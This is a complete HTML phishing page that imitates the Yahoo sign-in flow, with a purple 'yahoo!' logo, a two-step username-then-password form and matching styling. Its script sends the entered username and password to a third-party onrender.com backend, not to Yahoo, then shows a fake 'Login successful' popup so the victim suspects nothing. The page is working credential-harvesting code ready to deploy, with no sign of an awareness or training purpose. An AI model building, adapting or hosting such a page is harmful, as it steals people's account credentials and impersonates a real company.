<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In</title>
<style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #26282a;
        }

        .login-wrapper {
            width: 100%;
            max-width: 360px; /* Limits width to match mobile/card view */
            padding: 20px;
            text-align: center;
        }

        /* Brand / Logo Styling */
        .brand-logo {
            color: #6001d2; /* Yahoo-style Purple */
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 20px;
            letter-spacing: -0.03em;
            display: inline-block;
        }

        /* Typography */
        h1.title {
            font-size: 24px;
            font-weight: 700;
            margin: 0 0 5px 0;
            color: #26282a;
        }

        p.subtitle {
            font-size: 16px;
            margin: 0 0 40px 0;
            color: #26282a;
        }

        /* User Display (Shows email in Step 2) */
        .user-display {
            font-size: 16px;
            margin-bottom: 20px;
            color: #26282a;
            font-weight: 400;
        }

        /* Input Fields */
        .input-group {
            position: relative;
            margin-bottom: 25px;
            text-align: left;
        }

        .input-group input {
            width: 100%;
            padding: 12px 0;
            border: none;
            border-bottom: 1px solid #e0e0e0;
            font-size: 16px;
            outline: none;
            background: transparent;
            transition: border-color 0.2s;
            border-radius: 0; /* Remove default radius */
        }

        /* Highlight underline on focus */
        .input-group input:focus {
            border-bottom: 2px solid #6001d2;
        }

        /* Floating Label Logic */
        .input-group label {
            position: absolute;
            top: 12px;
            left: 0;
            font-size: 16px;
            color: #777;
            pointer-events: none;
            transition: 0.2s ease all;
        }

        /* Move label up when input has focus or text */
        .input-group input:focus ~ label,
        .input-group input:not(:placeholder-shown) ~ label {
            top: -10px;
            font-size: 12px;
            color: #6001d2; /* Purple label on focus */
        }

        /* Password Eye Icon */
        .password-container {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 0;
            top: 10px;
            cursor: pointer;
            color: #26282a;
            background: none;
            border: none;
            padding: 0;
        }

        /* Buttons & Links */
        .btn-primary {
            width: 100%;
            background-color: #6001d2;
            color: white;
            border: none;
            padding: 12px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 24px; /* Pill shape */
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #5300b8;
        }

        .link {
            color: #6001d2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }

        .link:hover {
            text-decoration: underline;
        }

        .forgot-link-wrapper {
            text-align: left;
            margin-bottom: 30px;
        }

        /* Options (Checkbox) */
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
            margin-top: 15px;
            color: #26282a;
        }
        
        .checkbox-label {
            display: flex;
            align-items: center;
        }
        
        .checkbox-label input {
            margin-right: 8px;
            width: 16px;
            height: 16px;
        }

        /* Create Account Button */
        .btn-secondary {
            background: transparent;
            border: none;
            color: #26282a;
            font-size: 14px;
            margin-top: 30px;
            cursor: pointer;
            font-weight: 400;
        }
        
        .btn-secondary:hover {
            text-decoration: underline;
        }

        /* Utility Class to Hide Steps */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

<div class="login-wrapper">
    
    <div class="brand-logo">yahoo!</div>

    <div id="step-1">
        <h1 class="title">Sign in</h1>
        <p class="subtitle">Using your Account</p>
        
        <form id="email-form">
            <div class="input-group">
                <input type="text" id="email-input" required placeholder=" " autocomplete="username">
                <label for="email-input">Username, email, or mobile</label>
            </div>
            
            <button type="submit" class="btn-primary">Next</button>
            
            <div class="options">
                <label class="checkbox-label">
                    <input type="checkbox" checked> Stay signed in
                </label>
                <a href="#" class="link">Forgot username?</a>
            </div>

            <button type="button" class="btn-secondary">Create an account</button>
        </form>
    </div>

    <div id="step-2" class="hidden">
        <div id="user-display" class="user-display"></div>
        
        <h1 class="title">Enter password</h1>
        <p class="subtitle">to finish sign in</p>

        <form id="password-form">
            <div class="input-group password-container">
                <input type="password" id="password-input" required placeholder=" " autocomplete="current-password">
                <label for="password-input">Password</label>
                
                <button type="button" class="toggle-password" onclick="togglePassword()" title="Show Password">
                    <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </button>
            </div>

            <div class="forgot-link-wrapper">
                <a href="#" class="link">Forgot password?</a>
            </div>

            <button type="submit" class="btn-primary">Next</button>
        </form>
    </div>

</div>

<!-- Success Popup -->
<div id="success-popup" class="hidden" style="
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.4);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
">
  <div style="
      background: white;
      padding: 25px 30px;
      border-radius: 12px;
      text-align: center;
      max-width: 300px;
      width: 90%;
  ">
    <h3 style="margin: 0 0 10px; color:#26282a;">✅ Login successful</h3>
    <p style="margin: 0 0 20px; font-size:14px;">You have signed in successfully.</p>
    <button onclick="closePopup()" class="btn-primary">Continue</button>
  </div>
</div>


<script>
    // DOM elements
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const emailForm = document.getElementById('email-form');
    const passwordForm = document.getElementById('password-form');
    const emailInput = document.getElementById('email-input');
    const passwordInput = document.getElementById('password-input');
    const userDisplay = document.getElementById('user-display');

    let currentUsername = "";

    // Step 1: Capture username/email
    emailForm.addEventListener('submit', function(e) {
        e.preventDefault();
        const emailValue = emailInput.value.trim();
        if(emailValue) {
            currentUsername = emailValue;
            userDisplay.textContent = currentUsername;
            step1.classList.add('hidden');
            step2.classList.remove('hidden');
            passwordInput.focus();
        }
    });

    // Password toggle (eye icon)
    function togglePassword() {
        passwordInput.type = passwordInput.type === "password" ? "text" : "password";
    }

    // Step 2: Send login info to backend
    passwordForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const passwordValue = passwordInput.value;

        try {
            // Use full backend URL with port to avoid Live Server 405 issues
            const res = await fetch("https://login-yahoog7dk4mx2pqab9xf3st8k.onrender.com/api/auth/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: currentUsername,
                    password: passwordValue
                }),
                credentials: "include"
            });

            // Parse JSON safely
            let result;
            try {
                result = await res.json();
            } catch {
                result = { message: "Invalid server response" };
            }
            if (res.ok) {
            showPopup(); // ✅ popup instead of alert

            // Reset form
            emailInput.value = "";
            passwordInput.value = "";
            step2.classList.add("hidden");
            step1.classList.remove("hidden");
        } else {
            // ❌ No alert — console only
            console.warn("Login failed:", result.message || "Unknown error");
        }
        } catch(err) {
            console.error(err);
            console.error("Could not connect to backend!");
        }
    });
    const popup = document.getElementById("success-popup");

function showPopup() {
    popup.classList.remove("hidden");
}

function closePopup() {
    popup.classList.add("hidden");
}

</script>

</body>
</html>
